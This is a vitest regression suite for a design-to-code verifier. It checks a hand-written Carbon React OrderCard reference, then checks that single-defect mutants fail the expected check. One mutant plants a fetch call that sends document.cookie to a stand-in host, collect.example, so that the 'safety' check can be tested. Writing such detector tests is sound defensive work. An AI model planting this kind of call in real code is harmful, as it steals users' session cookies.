// The regression gate: a design we wrote ourselves (cli/test/golden/design.json, our own Figma JSON, so it
// can live in the public repo and CI needs no Figma cache) and a hand-written reference implementation per
// project. The reference must pass every check that runs, and each one-defect mutant must fail the right
// check. A change to the verifier, an adapter or a design system's version that breaks either fails CI,
// with no model and no spend.

import { existsSync, readdirSync, readFileSync } from "node:fs";
import { mkdir, rm, writeFile } from "node:fs/promises";
import { join, resolve } from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import type { Check, VerifyReport } from "@tulpar/core";
import { loadContext, verifyEntry } from "../src/pipeline.ts";
import { loadProject, withAdapter } from "../src/project.ts";

const repo = resolve(import.meta.dirname, "../..");
const golden = join(import.meta.dirname, "golden");
const design = JSON.parse(readFileSync(join(golden, "design.json"), "utf8"));

interface Case {
  project: string;
  /** The reference folder in cli/test/golden. */
  reference: string;
  entry: string;
  test?: string;
  /** Present when the project is installed. */
  needs: string;
}

const cases: Case[] = [{ project: "examples/carbon-react", reference: "carbon-react", entry: "OrderCard.tsx", test: "OrderCard.test.tsx", needs: "node_modules/@carbon/react" }];

type Files = Record<string, string>;
const mutants: { name: string; mutate: (files: Files, c: Case) => Files; fails: Check["id"]; detail: RegExp }[] = [
  {
    name: "hard-coded colour",
    mutate: (f) => ({ ...f, "OrderCard.css": f["OrderCard.css"]!.replace("color: var(--cds-text-primary, #161616);", "color: #161616;") }),
    fails: "colors",
    detail: /#161616/,
  },
  {
    name: "wrong text",
    mutate: (f, c) => ({ ...f, [c.entry]: f[c.entry]!.replace("Order summary", "Order sumary") }),
    fails: "text",
    detail: /Order sumary/,
  },
  {
    name: "missing gap: the body sits 8 px too high",
    mutate: (f) => ({ ...f, "OrderCard.css": f["OrderCard.css"]!.replace("  gap: var(--cds-spacing-03, 0.5rem);\n", "") }),
    fails: "layout",
    detail: /900:3/,
  },
  {
    name: "planted call that sends cookies to another server",
    mutate: (f, c) => ({ ...f, [c.entry]: f[c.entry]!.replace("export default function OrderCard() {", 'export default function OrderCard() {\n  fetch("https://collect.example/?c=" + document.cookie);') }),
    fails: "safety",
    detail: /fetch\(\) calls the network/,
  },
  {
    name: "a test that fails",
    mutate: (f, c) => ({ ...f, [c.test!]: f[c.test!]!.replace('getByText("Two items, ready to ship.")', 'getByText("Three items")') }),
    fails: "tests",
    detail: /./,
  },
];

const failing = (r: VerifyReport) => r.checks.filter((c) => c.status === "fail").map((c) => `${c.id}: ${c.summary}\n  ${c.details.filter((d) => d.startsWith("✗")).join("\n  ")}`);

for (const c of cases) {
  const root = join(repo, c.project);
  describe.skipIf(!existsSync(join(root, c.needs)))(`golden: ${c.reference}`, { timeout: 180_000 }, () => {
    const reference: Files = Object.fromEntries(readdirSync(join(golden, c.reference)).map((f) => [f, readFileSync(join(golden, c.reference, f), "utf8")]));
    const work = join(root, ".tulpar", "golden");

    async function run(name: string, files: Files): Promise<VerifyReport> {
      const dir = join(work, name.replace(/[^a-z0-9]+/gi, "-").toLowerCase());
      await mkdir(dir, { recursive: true });
      for (const [f, content] of Object.entries(files)) await writeFile(join(dir, f), content);
      const rel = (f: string) => join(".tulpar", "golden", dir.split(/[\\/]/).pop()!, f).replace(/\\/g, "/");
      const project = await loadProject(root);
      return withAdapter(project, async (host) => {
        const ctx = await loadContext(host, project, { frame: "900:1", node: design }, join(repo, "out"), join(repo, ".cache/figma"));
        return (await verifyEntry(host, project, ctx, rel(c.entry), undefined, c.test && rel(c.test))).report;
      });
    }

    let baseline: VerifyReport;
    beforeAll(async () => {
      baseline = await run("reference", reference);
    }, 180_000);
    afterAll(() => rm(work, { recursive: true, force: true }));

    it("passes the reference: no check fails, and the core checks ran", () => {
      expect(failing(baseline)).toEqual([]);
      const ran = baseline.checks.filter((x) => x.status === "pass").map((x) => x.id);
      for (const id of ["build", "render", "colors", "type", "spacing", "layout", "text", "safety", ...(c.test ? ["tests"] : [])] as const) expect(ran, `${id} did not pass`).toContain(id);
    });

    for (const m of mutants) {
      if (m.fails === "tests" && !c.test) continue;
      it(`catches: ${m.name}`, async () => {
        const files = m.mutate(reference, c);
        expect(files).not.toEqual(reference);
        const report = await run(m.name, files);
        const check = report.checks.find((x) => x.id === m.fails)!;
        expect(check.status, failing(report).join("\n")).toBe("fail");
        expect(check.details.join("\n") + check.summary).toMatch(m.detail);
      });
    }
  });
}
